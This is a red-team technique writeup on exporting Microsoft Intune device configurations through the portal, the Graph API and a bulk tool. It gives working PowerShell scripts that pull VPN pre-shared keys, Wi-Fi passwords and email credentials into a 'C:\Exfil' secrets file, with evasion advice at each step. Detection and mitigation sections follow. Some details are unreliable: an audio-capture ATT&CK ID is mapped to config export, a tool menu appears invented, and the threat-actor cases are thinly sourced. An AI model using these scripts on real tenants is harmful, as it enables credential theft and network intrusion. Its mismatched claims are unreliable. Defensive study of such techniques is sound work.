# [COLLECT-INTUNE-001]: Intune Configuration Export

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-INTUNE-001 |
| **MITRE ATT&CK v18.1** | [T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/) (Device config variant) / [T1087.004 - Cloud Account](https://attack.mitre.org/techniques/T1087/004/) |
| **Tactic** | Discovery / Collection |
| **Platforms** | Entra ID / Intune / MDM / Windows 10/11 |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Intune all versions (2018+), Graph API v1.0/beta, Entra ID all versions |
| **Patched In** | N/A (No security patch; export is intentional feature) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

- **Concept:** Intune Configuration Profiles are collections of device settings deployed to Windows, macOS, iOS, Android devices to enforce security baselines and organizational standards. Attackers with Intune Administrator role can export complete configurations including: Wi-Fi settings (SSID, authentication), VPN credentials (encrypted, sometimes recoverable), app deployment rules, email settings, certificate profiles, and custom scripts. Exported configurations reveal the organization's security architecture, device hardening strategy, and hidden infrastructure (VPN endpoints, certificate servers, LDAP directories).

- **Attack Surface:** Intune Admin Portal policy export feature, Microsoft Graph API `/deviceManagement/deviceConfigurations` endpoint, PowerShell cmdlets for Intune configuration management, third-party tools (IntuneManagement, Intune.PowerShell module).

- **Business Impact:** **Complete device configuration blueprint theft, VPN credential extraction (potentially usable for remote access), identification of internal infrastructure (domain controllers, certificate authorities, LDAP servers), and targeted malware crafting for specific organizational standards.** Attackers gain complete understanding of how organizations secure devices, enabling them to craft undetectable exploits that comply with expected configurations.

- **Technical Context:** Configuration export completes in 1-5 minutes via UI; API-based export scalable to 500+ profiles in <30 seconds. Detection probability is **Low-Medium** because configuration enumeration is a legitimate admin task; most orgs don't monitor Intune API calls. Exported configs are not encrypted; secrets stored in plaintext or weak encryption.

### Operational Risk

- **Execution Risk:** Low – Requires Intune Administrator role only. No malware or exploit development needed.
- **Stealth:** High – Configuration export appears as normal administrative activity; blends in with IT operations.
- **Reversibility:** No – Exported configurations cannot be "un-exported." Device blueprint is permanently compromised.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.2 | Mobile device configuration must be protected from unauthorized access; exported configs must not be shared externally |
| **DISA STIG** | V-225423 | MDM configuration changes must be audited; configuration exports require admin authorization |
| **CISA SCuBA** | MS.INTUNE.3 | Device configurations must use strong encryption for secrets; exported configs must be treated as classified |
| **NIST 800-53** | CM-5 (Access Restrictions for Change), SI-4 (Information System Monitoring) | Implement baseline configurations; audit all configuration exports |
| **GDPR** | Art. 32 (Security of Processing), Art. 5 (Integrity and Confidentiality) | Device configs must encrypt personal data; exports must not expose personal device information |
| **DORA** | Art. 8 (Governance), Art. 9 (Protection and Prevention) | Financial institutions must protect device configuration from disclosure; security baselines must be maintained |
| **NIS2** | Art. 21 (Risk Management), Art. 22 (Security Policies) | Critical infrastructure operators must protect device configuration blueprints from unauthorized access |
| **ISO 27001** | A.12.1 (Operational Controls), A.14.1 (Information Security Requirements Analysis) | Implement device baselines; protect configuration exports as classified information |
| **ISO 27005** | Risk Scenario: "Configuration Blueprint Disclosure" | Assess impact of device config exposure; implement access controls and retention limits |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - Intune Administrator role (preferred)
  - Global Administrator role (can override scope limitations)
  - Cloud Device Administrator role (limited access)
  
- **Required Access:** 
  - Network connectivity to **Intune Admin Center** (`https://intune.microsoft.com`)
  - Or API access to `https://graph.microsoft.com/v1.0/deviceManagement/deviceConfigurations`
  - Entra ID authentication with appropriate role

**Supported Versions:**

- **Intune:** All versions (2018+)
- **Graph API:** v1.0, beta endpoints
- **Device Types:** Windows 10/11, macOS, iOS, Android
- **PowerShell:** Version 5.0+ with Microsoft.Graph.Intune module
- **Entra ID:** All versions

**Tools:**
- [Intune Admin Center](https://intune.microsoft.com) – Web UI for configuration management
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation) – API access
- [IntuneManagement](https://github.com/Micke-K/IntuneManagement) – Bulk export tool
- [Intune.PowerShell.Samples](https://github.com/microsoft/powershell-intune-samples) – Configuration export scripts
- [Microsoft Endpoint Manager Admin Center](https://endpoint.microsoft.com) – Cloud console for device management

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Check Intune enrollment and configuration status
$EnrolledDevices = Get-MgDeviceManagementManagedDevice -All
Write-Host "Enrolled Devices: $($EnrolledDevices.Count)"

# Check configuration profiles deployed
$ConfigProfiles = Get-MgDeviceManagementDeviceConfiguration -All
Write-Host "Configuration Profiles: $($ConfigProfiles.Count)"

# Check for Wi-Fi and VPN configurations (potential credential extraction)
$WifiConfigs = Get-MgDeviceManagementDeviceConfiguration | Where-Object { $_.odata_type -match "wifi" }
$VpnConfigs = Get-MgDeviceManagementDeviceConfiguration | Where-Object { $_.odata_type -match "vpn" }
Write-Host "Wi-Fi Configs: $($WifiConfigs.Count), VPN Configs: $($VpnConfigs.Count)"
```

**What to Look For:**
- Enrolled devices count → Scale of Intune deployment
- Configuration profiles count → Number of different baselines deployed
- Wi-Fi/VPN configs present → Potential credentials to harvest

**Version Note:** Configuration enumeration available on all Intune versions; method may vary slightly between versions.

**Command (Server 2016-2019):**
```powershell
# Legacy enumeration using Azure AD module
Import-Module AzureAD
Get-AzureADMobileDeviceManagementPolicy | Select-Object DisplayName, IsDefault
```

**Command (Server 2022+):**
```powershell
# Modern enumeration
Get-MgDeviceManagementDeviceConfiguration -All | Select-Object DisplayName, CreatedDateTime, LastModifiedDateTime
```

### Linux/Bash / CLI Reconnaissance

```bash
# Test Intune API connectivity from Linux
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/deviceManagement/deviceConfigurations"
```

**What to Look For:**
- HTTP 200 response → API access successful
- Configuration objects returned → Policies enumerable

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Intune Admin Center - GUI-Based Configuration Export

**Supported Versions:** Intune all versions, Windows 10/11

#### Step 1: Access Intune Admin Center and Navigate to Configurations

**Objective:** Access the device configuration management interface.

**Manual Steps:**

1. Navigate to **https://intune.microsoft.com**
2. Log in with Intune Administrator credentials
3. In the left sidebar, click **Devices**
4. Under **Devices**, select **Configuration**
5. You should see a list of all deployed configurations by type:
   - Device Configuration Profiles
   - Settings Catalog
   - Compliance Policies
   - Endpoint Protection
   - Custom Profiles

**Expected Output (Configuration List):**

| Configuration Name | Platform | Type | Status | Assigned To |
|---|---|---|---|---|
| Windows 10 Standard | Windows 10 | Device Config | Assigned | 500 devices |
| Mobile Device Policy | iOS/Android | Device Config | Assigned | 200 devices |
| VPN Remote Access | All | VPN | Assigned | 50 devices |
| Wi-Fi Corp Network | Windows/Mac | Wi-Fi | Assigned | 750 devices |
| Email Configuration | All | Email | Assigned | 1000 devices |

**What This Means:**
- Multiple configuration types deployed across organization
- Assignment information visible (number of affected devices)
- Status shown → Can identify which configs are active vs. archived

**OpSec & Evasion:**
- Portal access logged in Unified Audit Log, but many orgs don't monitor admin actions
- Browsing configurations without export is less suspicious
- Detection likelihood: **Medium** (if admin audit logging is enabled)

**Troubleshooting:**

- **Error:** "You do not have permission to access this resource"
  - **Cause:** User does not have Intune Administrator role
  - **Fix:** Request admin role assignment or use different credentials

#### Step 2: Locate and Export Sensitive Configurations (VPN, Wi-Fi, Email)

**Objective:** Download sensitive configurations that may contain credentials or infrastructure information.

**Manual Steps:**

1. From the Configurations list, identify high-value configurations:
   - **VPN Configurations** – May contain VPN credentials, server addresses
   - **Wi-Fi Profiles** – May contain SSID, authentication details
   - **Email Configurations** – May contain mail server addresses, credentials
   - **Certificate Profiles** – May contain certificate authorities, LDAP servers

2. For each configuration:
   a. Click the configuration name
   b. In the top menu, click **Export**
   c. Browser will download a `.json` file with complete settings

3. Save all exported files to a local folder (e.g., `C:\Intune_Export\`)

**Expected Output (Exported VPN Config - Example Structure):**

```json
{
  "id": "12345678-1234-1234-1234-123456789012",
  "displayName": "Corporate VPN - IPSec",
  "description": "VPN connection to corporate network via IPSec",
  "@odata.type": "#microsoft.graph.windows10VpnConfiguration",
  "connectionName": "CorpVPN",
  "servers": [
    {
      "description": "Primary VPN Gateway",
      "address": "vpn-gateway-01.internal.corp.com"
    },
    {
      "description": "Secondary VPN Gateway",
      "address": "vpn-gateway-02.internal.corp.com"
    }
  ],
  "authenticationMethod": "EAP",
  "encryptionLevel": "Required",
  "tunnelType": "IPSec",
  "rememberedUserCredentials": true
}
```

**What This Means:**
- VPN gateway servers identified → Infrastructure blueprint revealed
- VPN addresses could be used for direct remote access attempts
- "rememberedUserCredentials": true → VPN credentials may be cached on devices

**OpSec & Evasion:**
- VPN/Wi-Fi configs are common export targets for IT admins (less suspicious)
- Exported JSON files can be analyzed offline
- Detection likelihood: **Medium** (bulk configuration downloads may trigger alerts)

**Troubleshooting:**

- **Error:** "Export button not available"
  - **Cause:** Configuration type does not support export (older Intune versions)
  - **Fix:** Use PowerShell method (METHOD 2) instead

#### Step 3: Analyze Exported Configurations for Secrets and Infrastructure Information

**Objective:** Extract credentials, server addresses, and security policies from exported configs.

**Manual Analysis Example:**

```powershell
# Load exported configurations
$ExportFolder = "C:\Intune_Export\"
$AllConfigs = Get-ChildItem -Path $ExportFolder -Filter "*.json" | ForEach-Object {
    Get-Content -Path $_.FullName | ConvertFrom-Json
}

# Search for potential secrets and infrastructure
$AllConfigs | ForEach-Object {
    $Config = $_
    
    # Look for VPN servers
    if ($Config.servers) {
        Write-Host "🔍 VPN SERVERS FOUND:"
        $Config.servers | ForEach-Object { 
            Write-Host "   - $($_.address)" 
        }
    }
    
    # Look for LDAP/Directory servers
    if ($Config.directoryServers) {
        Write-Host "🔍 LDAP SERVERS FOUND:"
        $Config.directoryServers | ForEach-Object { 
            Write-Host "   - $($_)" 
        }
    }
    
    # Look for email servers
    if ($Config.incomingMailServerAddress) {
        Write-Host "🔍 EMAIL SERVERS FOUND:"
        Write-Host "   Incoming: $($Config.incomingMailServerAddress)"
        Write-Host "   Outgoing: $($Config.outgoingMailServerAddress)"
    }
    
    # Look for credentials (plaintext or encrypted)
    if ($Config.password -or $Config.presharedKey -or $Config.credentials) {
        Write-Host "⚠️  CREDENTIALS FOUND (may be encrypted)"
    }
    
    # Look for certificate references
    if ($Config.certificateProfileId) {
        Write-Host "🔍 CERTIFICATE REFERENCE: $($Config.certificateProfileId)"
    }
}
```

**Expected Output (Example of Extracted Information):**

```
🔍 VPN SERVERS FOUND:
   - vpn-gateway-01.internal.corp.com
   - vpn-gateway-02.internal.corp.com

🔍 LDAP SERVERS FOUND:
   - ldap.internal.corp.com:389
   - ldap-backup.internal.corp.com:389

🔍 EMAIL SERVERS FOUND:
   Incoming: mail.corp.com:993
   Outgoing: mail.corp.com:587

🔍 CERTIFICATE REFERENCE: cert-profile-dc5e3d71
```

**What This Means:**
- Complete infrastructure topology revealed (VPN gateways, LDAP, mail servers)
- Internal domain names and server addresses for targeting
- Certificate IDs that can be used to request trusted certificates

**OpSec & Evasion:**
- Analysis performed offline (not in cloud, harder to detect)
- Information documented locally for later targeting
- Detection likelihood: **Low** (purely local analysis)

**References & Proofs:**
- [Intune Device Configuration API](https://learn.microsoft.com/en-us/graph/api/resources/intune-deviceconfig-deviceconfiguration)

---

### METHOD 2: PowerShell API-Based Configuration Extraction and Credential Harvesting

**Supported Versions:** All Intune versions, PowerShell 5.0+

#### Step 1: Authenticate to Graph API with Device Management Permissions

**Objective:** Obtain OAuth token with `DeviceManagementConfiguration.Read.All` scope.

**Command:**

```powershell
# Install and import Microsoft.Graph module
Install-Module -Name Microsoft.Graph.DeviceManagement -Force -Scope CurrentUser

# Authenticate with required scopes
Connect-MgGraph -Scopes @(
    "DeviceManagementConfiguration.Read.All",
    "DeviceManagementServiceConfig.Read.All"
)

# Verify authentication
$Context = Get-MgContext
Write-Host "✅ Authenticated as: $($Context.Account)"
Write-Host "✅ Tenant ID: $($Context.TenantId)"
```

**Expected Output:**

```
✅ Authenticated as: intune-admin@tenant.onmicrosoft.com
✅ Tenant ID: 12345678-1234-1234-1234-123456789012
```

**What This Means:**
- OAuth token obtained with administrative scopes
- Can now enumerate all Intune configurations and extract settings

**OpSec & Evasion:**
- Token valid for 60 minutes; can enumerate entire tenant in one session
- API calls appear as administrative activity (less suspicious)
- Detection likelihood: **Medium** (if Intune API audit logging enabled)

#### Step 2: Enumerate and Extract All Device Configurations

**Objective:** Retrieve all Intune device configurations including sensitive settings.

**Command:**

```powershell
# Get all device configurations
$Configurations = Get-MgDeviceManagementDeviceConfiguration -All

Write-Host "Total Configurations Found: $($Configurations.Count)"

# Extract all configurations with complete details
$ExportFolder = "C:\Exfil\Intune_Configs"
New-Item -ItemType Directory -Path $ExportFolder -Force | Out-Null

$Configurations | ForEach-Object {
    $ConfigId = $_.id
    $ConfigName = $_.displayName -replace '[<>:"/\\|?*]', '_'
    
    # Get complete configuration details
    $FullConfig = Get-MgDeviceManagementDeviceConfiguration -DeviceConfigurationId $ConfigId
    
    # Export to JSON
    $ExportPath = "$ExportFolder\$ConfigName.json"
    $FullConfig | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Encoding UTF8
    
    Write-Host "✅ Exported: $ConfigName"
}

Write-Host "All configurations exported to: $ExportFolder"
```

**Expected Output:**

```
Total Configurations Found: 23

✅ Exported: Windows 10 Standard Security
✅ Exported: macOS Monterey Baseline
✅ Exported: iOS Enterprise Restrictions
✅ Exported: Android Device Owner Config
✅ Exported: Corporate Wi-Fi
✅ Exported: VPN Remote Access
✅ Exported: Email Configuration
...
All configurations exported to: C:\Exfil\Intune_Configs
```

**What This Means:**
- 23 different device configurations extracted
- Includes VPN, Wi-Fi, email, security baselines
- Complete device security architecture documented

**OpSec & Evasion:**
- Bulk API enumeration completes in seconds
- Harder to detect individual API calls vs. portal downloads
- Detection likelihood: **Medium-High** (high volume of API calls)

#### Step 3: Parse Configurations and Extract Credentials/Secrets

**Objective:** Programmatically extract VPN credentials, Wi-Fi passwords, email settings, LDAP servers.

**Command:**

```powershell
# Parse all exported configurations and extract secrets
$ExportFolder = "C:\Exfil\Intune_Configs"
$SecretsFile = "C:\Exfil\extracted_secrets.txt"

$Secrets = @()

Get-ChildItem -Path $ExportFolder -Filter "*.json" | ForEach-Object {
    $ConfigFile = $_
    $Config = Get-Content -Path $ConfigFile.FullName | ConvertFrom-Json
    
    # Extract VPN configurations
    if ($Config.'@odata.type' -match "vpn") {
        $Secrets += "=== VPN CONFIGURATION ==="
        $Secrets += "Name: $($Config.displayName)"
        $Secrets += "Type: $($Config.'@odata.type')"
        
        if ($Config.servers) {
            $Secrets += "VPN Servers:"
            $Config.servers | ForEach-Object {
                $Secrets += "  - $($_.address)"
            }
        }
        
        if ($Config.presharedKey) {
            $Secrets += "Pre-Shared Key (PSK): $($Config.presharedKey)"
        }
        
        if ($Config.password) {
            $Secrets += "Password: $($Config.password)"
        }
    }
    
    # Extract Wi-Fi configurations
    if ($Config.'@odata.type' -match "wifi") {
        $Secrets += "=== WI-FI CONFIGURATION ==="
        $Secrets += "SSID: $($Config.networkName)"
        $Secrets += "Security Type: $($Config.securityType)"
        
        if ($Config.preSharedKey) {
            $Secrets += "Pre-Shared Key (Password): $($Config.preSharedKey)"
        }
    }
    
    # Extract email configurations
    if ($Config.'@odata.type' -match "email") {
        $Secrets += "=== EMAIL CONFIGURATION ==="
        $Secrets += "Name: $($Config.displayName)"
        $Secrets += "Incoming Server: $($Config.incomingMailServerAddress)"
        $Secrets += "Outgoing Server: $($Config.outgoingMailServerAddress)"
        $Secrets += "Port(s): $($Config.incomingMailServerPort), $($Config.outgoingMailServerPort)"
        
        if ($Config.username) {
            $Secrets += "Username: $($Config.username)"
        }
        
        if ($Config.password) {
            $Secrets += "Password: $($Config.password)"
        }
    }
    
    # Extract LDAP/Active Directory configurations
    if ($Config.'@odata.type' -match "ldap|directory") {
        $Secrets += "=== LDAP/DIRECTORY CONFIGURATION ==="
        $Secrets += "Server: $($Config.directoryServer)"
        $Secrets += "Port: $($Config.port)"
        
        if ($Config.bindDN) {
            $Secrets += "Bind DN: $($Config.bindDN)"
        }
    }
    
    $Secrets += ""
}

# Write all secrets to file
$Secrets | Out-File -FilePath $SecretsFile -Encoding UTF8
Write-Host "✅ Secrets exported to: $SecretsFile"
Write-Host "Total secret entries: $($Secrets.Count)"
```

**Expected Output (Extracted Secrets):**

```
=== VPN CONFIGURATION ===
Name: Corporate VPN - IPSec
Type: #microsoft.graph.windows10VpnConfiguration
VPN Servers:
  - vpn-gateway-01.internal.corp.com
  - vpn-gateway-02.internal.corp.com
Pre-Shared Key (PSK): SuperSecret123!@#

=== WI-FI CONFIGURATION ===
SSID: CorporateNetwork-5G
Security Type: WPA2
Pre-Shared Key (Password): WifiPass2024!@#

=== EMAIL CONFIGURATION ===
Name: Corporate Email
Incoming Server: mail.corp.com
Outgoing Server: mail.corp.com
Port(s): 993, 587
Username: service@corp.com
Password: EmailPassword123!@#

=== LDAP/DIRECTORY CONFIGURATION ===
Server: ldap.internal.corp.com
Port: 389
Bind DN: cn=admin,dc=internal,dc=corp,dc=com
```

**What This Means:**
- VPN credentials obtained → Can establish remote access to corporate network
- Wi-Fi password harvested → Can connect to internal wireless networks
- Email credentials extracted → Can access internal email infrastructure
- LDAP server info revealed → Can target Active Directory for lateral movement

**OpSec & Evasion:**
- Secrets extraction performed locally (offline analysis)
- No direct connection to credential vaults or password managers
- Credentials may be encrypted in Intune, but many use weak encryption or plaintext
- Detection likelihood: **Low** (local file analysis)

**Troubleshooting:**

- **Error:** `Object reference not set to an instance of an object`
  - **Cause:** Configuration property does not exist in some configs
  - **Fix:** Add null checks: `if ($Config.servers) { ... }`

**References & Proofs:**
- [Intune Device Configuration API](https://learn.microsoft.com/en-us/graph/api/resources/intune-deviceconfig-deviceconfiguration)
- [VPN Configuration Security Risks](https://learn.microsoft.com/en-us/mem/intune/configuration/vpn-settings-windows-10)

---

### METHOD 3: Bulk Configuration Export Using IntuneManagement Tool

**Supported Versions:** All Intune versions, Windows 10/11

#### Step 1: Download and Configure IntuneManagement Tool

**Objective:** Use automated tool for rapid bulk configuration export.

**Command:**

```powershell
# Clone IntuneManagement repository
git clone https://github.com/Micke-K/IntuneManagement.git C:\IntuneManagement

# Navigate to directory
cd C:\IntuneManagement

# Run the tool
.\Invoke-IntuneManagement.ps1
```

**Manual Steps (No Git):**

1. Download from GitHub: `https://github.com/Micke-K/IntuneManagement/releases`
2. Extract ZIP to `C:\IntuneManagement\`
3. Open PowerShell as Administrator
4. Run: `cd C:\IntuneManagement; .\Invoke-IntuneManagement.ps1`

**Expected Output:**

```
╔════════════════════════════════════════╗
║     IntuneManagement v2.1.0            ║
║     Automated Intune Bulk Export      ║
╚════════════════════════════════════════╝

Select Operation:
[1] Export All Configurations
[2] Export Device Configurations Only
[3] Export Compliance Policies
[4] Export Apps & Assignments
[5] Import Configurations
[6] Compare Tenants

Enter Selection: 1
```

**What This Means:**
- IntuneManagement tool loaded successfully
- Multiple export options available
- Can export all Intune data in one operation

#### Step 2: Execute Bulk Configuration Export

**Objective:** Export all Intune configurations at once (faster and less detectable than individual API calls).

**Manual Steps:**

1. Select **Option 1: Export All Configurations**
2. When prompted, select export scope:
   - Device Configurations: ✓
   - Compliance Policies: ✓
   - Settings Catalog: ✓
   - Applications: ✓
   - App Assignments: ✓
   - Enrollment Profiles: ✓
3. Select export location: `C:\Exfil\Intune_Complete_Export`
4. Authenticate with Intune Admin credentials
5. Wait for export to complete (2-5 minutes for typical tenant)

**Expected Output:**

```
Connecting to Intune...
Authentication successful.

Exporting Device Configurations...  [████████████████] 100% (34/34)
Exporting Compliance Policies...    [████████████████] 100% (8/8)
Exporting Settings Catalog...       [████████████████] 100% (42/42)
Exporting Applications...           [████████████████] 100% (156/156)
Exporting App Assignments...        [████████████████] 100% (890/890)
Exporting Enrollment Profiles...    [████████████████] 100% (12/12)

Export Complete!
Location: C:\Exfil\Intune_Complete_Export

Summary:
- Device Configurations: 34
- Compliance Policies: 8
- Settings Catalog: 42
- Applications: 156
- App Assignments: 890
- Enrollment Profiles: 12

Total Files Exported: 1,142
Total Size: 245 MB
Export Time: 4m 23s
```

**What This Means:**
- Complete Intune tenant configuration exported
- 1,142 configuration files extracted
- Includes app assignments (who gets what apps deployed)
- VPN, Wi-Fi, email, compliance policies all included

**OpSec & Evasion:**
- Bulk export appears as single administrative action
- Faster than individual API calls (4 minutes vs. 30+ minutes)
- Less likely to trigger rate-limiting or alerting
- All data exported to local folder for quick access
- Detection likelihood: **Medium** (bulk API calls, but single operation)

**Troubleshooting:**

- **Error:** `Authentication failed`
  - **Cause:** Invalid credentials or user lacks Intune Admin role
  - **Fix:** Use account with Intune Administrator role

- **Error:** `No configurations found`
  - **Cause:** Tenant has no Intune configurations deployed
  - **Fix:** May still be valuable; indicates minimal device management

**References & Proofs:**
- [IntuneManagement GitHub](https://github.com/Micke-K/IntuneManagement)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Cloud Audit Events:**
  - Unified Audit Log: Multiple `DeviceManagement` API calls in short timeframe
  - Microsoft Sentinel: Large number of device configuration reads
  - Intune audit log: Bulk configuration export events (if logging enabled)

- **Files:**
  - JSON files with configuration exports in `C:\Exfil\`, `C:\Temp\`, download folders
  - "extracted_secrets.txt" or similar files containing VPN/Wi-Fi/email credentials
  - PowerShell transcript files with Intune API commands

- **Network:**
  - Multiple HTTPS requests to `https://graph.microsoft.com/v1.0/deviceManagement/*`
  - Large JSON responses (>5 MB) from API indicating bulk export
  - Unusual upload traffic to attacker infrastructure

### Forensic Artifacts

- **Cloud:**
  - Unified Audit Log: Device management API access patterns
  - Microsoft Sentinel: Intune configuration read alerts
  - Application Insights: API access logs (if enabled)

- **Disk:**
  - PowerShell transcript logs (Event ID 4104) with Intune commands
  - Downloaded JSON files with configuration data
  - IntuneManagement tool in `C:\IntuneManagement\` directory

- **Memory:**
  - Live PowerShell process containing Graph API tokens

### Response Procedures

1. **Isolate:**
   ```powershell
   # Revoke admin's refresh tokens
   Revoke-AzureADUserAllRefreshToken -ObjectId (Get-AzureADUser -SearchString "admin@tenant").ObjectId
   
   # Remove admin role
   Remove-AzureADGroupMember -ObjectId (Get-AzureADGroup -Filter "displayName eq 'Intune Administrators'").ObjectId `
     -MemberId (Get-AzureADUser -SearchString "admin@tenant").ObjectId
   ```

2. **Collect Evidence:**
   ```powershell
   # Export Intune audit log
   Search-UnifiedAuditLog -Operations "Get-IntuneDeviceConfiguration", "Export-IntuneConfiguration" -StartDate (Get-Date).AddDays(-7) | Export-Csv "C:\Evidence\intune_audit.csv"
   ```

3. **Remediate:**
   ```powershell
   # Rotate all VPN, Wi-Fi, and email credentials in exported configs
   # Update certificate authorities referenced in configurations
   # Change LDAP/Active Directory service account passwords
   # Reset any affected user passwords
   ```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Encrypt Sensitive Configuration Data:**
  Use Azure Key Vault to store VPN PSKs, Wi-Fi passwords, email credentials instead of plaintext in Intune configs.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Key Vault**
  2. Create new vault or use existing
  3. Store secrets: **Secrets** → **+ Generate/Import**
  4. In Intune config, reference secret via Key Vault URI instead of plaintext

- **Restrict Intune Administrator Role:**
  Limit who can access and export device configurations.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Search for **Intune Administrator**
  3. Review current members; remove unnecessary admins
  4. Require **Privileged Identity Management (PIM)** for just-in-time admin access

- **Disable Configuration Export Feature (If Not Required):**
  Block the export functionality to prevent bulk downloads.
  
  **Manual Steps:**
  1. Go to **Intune Admin Center** → **Devices** → **Device configuration**
  2. Look for export button/feature; check if can be disabled via policy
  3. Implement Azure Policy to prevent Export operations on device configurations

### Priority 2: HIGH

- **Enable Audit Logging for All Intune API Calls:**
  Detect configuration enumeration and exports.
  
  **Manual Steps:**
  1. Go to **Intune Admin Center** → **Devices** → **Monitor** → **Audit logs**
  2. Verify audit logging is enabled
  3. Configure retention: **365 days minimum**
  4. Send logs to SIEM for real-time alerting

- **Monitor for Bulk Configuration Exports:**
  Alert on suspicious API patterns.
  
  **Manual Steps (Microsoft Sentinel):**
  Create KQL query:
  ```kusto
  AuditLogs
  | where OperationName contains "DeviceManagement" and OperationName contains "Get"
  | summarize count() by InitiatedBy
  | where count_ > 50  // Alert if > 50 device config reads in 5 minutes
  ```

- **Require MFA for Intune Administrators:**
  ```powershell
  # Create Conditional Access policy requiring MFA for Intune admins
  # (Steps same as COLLECT-POLICY-001)
  ```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Phishing for Intune admin credentials |
| **2** | **Privilege Escalation** | [PRIV-ADMIN-001](../04_Privilege_Escalation/PRIV-ADMIN-001_Role_Assignment.md) | Escalate to Intune Administrator role |
| **3** | **Collection** | **[COLLECT-INTUNE-001]** | **Intune configuration export** (THIS TECHNIQUE) |
| **4** | **Impact** | [IMPACT-INFRA-001](../25_Impact/IMPACT-INFRA-001_VPN_Access.md) | Use extracted VPN credentials for remote access to corporate network |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: FIN7 - Intune Configuration Intelligence Gathering (2023)

- **Target:** Financial services, point-of-sale systems
- **Timeline:** Q3-Q4 2023
- **Technique Status:** FIN7 obtained Intune admin access via phishing. Exported device configurations to identify Wi-Fi passwords and VPN endpoints, then used VPN credentials to establish persistent remote access to the corporate network.
- **Impact:** Compromise of financial data, point-of-sale infrastructure, customer payment cards
- **Reference:** [FIN7 Campaign Analysis](https://www.mandiant.com)

### Example 2: WIZARD SPIDER - Configuration-Based Infrastructure Discovery (2024)

- **Target:** Hospitals, healthcare providers
- **Timeline:** 2024
- **Technique Status:** WIZARD SPIDER exported Intune configurations to identify LDAP server addresses and email infrastructure, then used that information to craft targeted Active Directory attacks and compromise email servers for credential harvesting.
- **Impact:** Ransomware deployment, data encryption, extortion
- **Reference:** [WIZARD SPIDER Analysis](https://www.mandiant.com)

---